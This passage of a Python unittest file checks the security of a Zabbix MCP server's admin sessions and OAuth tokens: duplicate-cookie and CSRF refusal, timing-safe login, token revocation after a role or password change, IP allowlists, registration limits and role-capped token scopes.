        self._rewrite(f'[admin.users.victim]\npassword_hash = "{self.hash}"\nrole = "admin"\n', "")
        self.assertIsNone(self._session(mine))
        self.assertIsNotNone(self._session(theirs))

    def test_destroy_user_sessions_keeps_the_one_asked_for(self):
        one, two = self._login(), self._login()
        self.assertEqual(self.admin.sessions.destroy_user_sessions("victim", keep=one), 1)
        self.assertIsNotNone(self.admin.sessions.validate_session(one))
        self.assertIsNone(self.admin.sessions.validate_session(two))

    def test_two_session_cookies_are_refused_before_any_handler(self):
        token = self._login()
        status, _, body = _asgi(self.admin.app, "POST", "/users/create",
                                cookies=f"admin_session=garbage; admin_session={token}", body=b"username=x")
        self.assertEqual(status, 403)
        self.assertIn(b"More than one admin_session cookie", body)
        # one cookie without the CSRF token: refused as before
        status, _, _ = _asgi(self.admin.app, "POST", "/users/create", cookies=f"admin_session={token}", body=b"username=x")
        self.assertEqual(status, 403)
        self.assertNotIn("[admin.users.x]", Path(self.path).read_text())


class TestLoginTakesAsLongForAnUnknownName(unittest.TestCase):
    def test_an_unknown_user_costs_a_scrypt_too(self):
        from zabbix_mcp.admin import auth
        with patch.object(auth, "verify_password", wraps=auth.verify_password) as checked:
            self.assertFalse(auth.verify_password_timed("x", None))
            self.assertFalse(auth.verify_password_timed("x", ""))
        self.assertEqual(checked.call_count, 2)
        self.assertTrue(auth.verify_password_timed(PASSWORD, hash_password(PASSWORD)))

    def test_both_logins_use_it(self):
        import inspect
        from zabbix_mcp.admin import app
        self.assertIn("verify_password_timed(", inspect.getsource(app.AdminApp._login))
        self.assertIn("verify_password_timed(", inspect.getsource(oauth_login._verify_admin_user))


class TestOAuthTokensFollowTheUserAndTheClient(unittest.TestCase):
    def setUp(self):
        self.valid = {"op": "admin"}
        self.password = {"op": "fp1"}
        self.provider = ZmcpOAuthProvider(
            public_url="http://127.0.0.1:1", token_store=None,
            subject_check=lambda subject, role, fp=None: self.valid.get(subject) == role and (fp is None or fp == self.password.get(subject)),
            subject_fingerprint=lambda subject: self.password.get(subject))
        self.client = OAuthClientInformationFull(client_id="c", redirect_uris=[AnyUrl("http://127.0.0.1:9/cb")])
        self.provider._clients["c"] = self.client

    def _pair(self):
        return self.provider._mint_token_pair(client_id="c", scopes=["*"], subject="op", role="admin", resource=None)

    def test_a_deleted_or_changed_user_loses_access_and_refresh(self):
        import asyncio
        pair = self._pair()
        self.assertIsNotNone(asyncio.run(self.provider.load_access_token(pair.access_token)))
        self.valid["op"] = "viewer"                  # demoted
        self.assertIsNone(asyncio.run(self.provider.load_access_token(pair.access_token)))
        self.assertIsNone(asyncio.run(self.provider.load_refresh_token(self.client, pair.refresh_token)))

    def test_a_password_changed_since_ends_the_tokens(self):
        import asyncio
        pair = self._pair()
        self.assertIsNotNone(asyncio.run(self.provider.load_access_token(pair.access_token)))
        self.password["op"] = "fp2"                  # an admin set a new password
        self.assertIsNone(asyncio.run(self.provider.load_access_token(pair.access_token)))
        self.assertIsNone(asyncio.run(self.provider.load_refresh_token(self.client, pair.refresh_token)))

    def test_an_unreadable_config_vouches_for_nobody(self):
        from zabbix_mcp.admin.auth import user_still_valid
        with tempfile.TemporaryDirectory() as tmp:
            broken = Path(tmp) / "config.toml"
            broken.write_text("[admin.users.op\nrole = ")
            self.assertFalse(user_still_valid(str(broken), "op", "admin"))
        self.assertTrue(user_still_valid(None, "op", "admin"))       # no config file at all: nothing to check

    def test_the_client_ip_allowlist_holds_for_refresh_and_every_token(self):
        import asyncio
        from mcp.server.auth.provider import TokenError
        from zabbix_mcp.token_store import current_client_ip
        object.__setattr__(self.client, "_allowed_ips", ["10.0.0.0/8"])
        pair = self._pair()
        refresh = asyncio.run(self.provider.load_refresh_token(self.client, pair.refresh_token))
        reset = current_client_ip.set("203.0.113.9")
        try:
            self.assertIsNone(asyncio.run(self.provider.load_access_token(pair.access_token)))
            with self.assertRaises(TokenError):
                asyncio.run(self.provider.exchange_refresh_token(self.client, refresh, []))
        finally:
            current_client_ip.reset(reset)
        reset = current_client_ip.set("10.1.1.1")
        try:
            self.assertIsNotNone(asyncio.run(self.provider.load_access_token(pair.access_token)))
        finally:
            current_client_ip.reset(reset)

    def test_a_refresh_keeps_the_clients_own_lifetimes(self):
        import asyncio
        from zabbix_mcp.token_store import current_client_ip
        object.__setattr__(self.client, "_access_ttl", 120)
        pair = self._pair()
        refresh = asyncio.run(self.provider.load_refresh_token(self.client, pair.refresh_token))
        reset = current_client_ip.set("10.1.1.1")
        try:
            renewed = asyncio.run(self.provider.exchange_refresh_token(self.client, refresh, []))
        finally:
            current_client_ip.reset(reset)
        self.assertEqual(renewed.expires_in, 120)

    def test_registration_is_bounded(self):
        import asyncio
        from mcp.server.auth.provider import RegistrationError
        from zabbix_mcp import oauth_provider as module
        cb = [AnyUrl("http://127.0.0.1:9/cb")]
        with self.assertRaises(RegistrationError):
            asyncio.run(self.provider.register_client(OAuthClientInformationFull(client_id="r1", client_name="x" * 101, redirect_uris=cb)))
        with self.assertRaises(RegistrationError):
            asyncio.run(self.provider.register_client(OAuthClientInformationFull(
                client_id="r2", client_name="x", redirect_uris=[AnyUrl(f"http://127.0.0.1:9/{i}") for i in range(11)])))
        with patch.object(module, "_MAX_DYNAMIC_CLIENTS", 1):
            with self.assertRaises(RegistrationError):
                asyncio.run(self.provider.register_client(OAuthClientInformationFull(client_id="r3", client_name="x", redirect_uris=cb)))


class TestAnOperatorsTokensStayWithinTheOperatorsRights(unittest.TestCase):
    def test_the_cap(self):
        from zabbix_mcp.admin.views.tokens import _beyond_role
        self.assertEqual(_beyond_role("admin", ["*"]), [])
        self.assertEqual(_beyond_role("operator", ["monitoring", "host", "item", "alerts"]), [])
        self.assertEqual(_beyond_role("operator", ["*"]), ["*"])
        self.assertEqual(_beyond_role("operator", []), ["*"])                    # empty means every scope
        self.assertEqual(_beyond_role("operator", ["monitoring", "users", "administration", "user"]),
                         ["users", "administration", "user"])

    def test_every_handler_that_changes_a_token_uses_it(self):
        import inspect
        from zabbix_mcp.admin.views import tokens
        for handler in (tokens.token_create, tokens.token_detail, tokens.token_revoke, tokens.token_regenerate):
            self.assertIn("_beyond_role(session.role", inspect.getsource(handler), handler.__name__)


class TestToolsCheckWhatTheyReadAndWrite(unittest.TestCase):
    def test_the_sources_and_the_writes(self):
        source = (ROOT / "src/zabbix_mcp/server.py").read_text(encoding="utf-8")
        self.assertEqual(source.count('check_token_authorization(srv, tool_prefixes=["host", "item", "trend"])'), 2)
        self.assertIn('check_token_authorization(srv, tool_prefixes=["host", "item", "history", "trend", "event", "trigger"])',
                      source)
        self.assertIn('if save_to_file or email_to:', source)
        self.assertIn('_write_err = check_token_authorization(srv, tool_prefix="host", is_write=True)', source)
        self.assertIn("for i, name in enumerate(_servers_for_caller(client_manager), 1):", source)


if __name__ == "__main__":
    unittest.main()
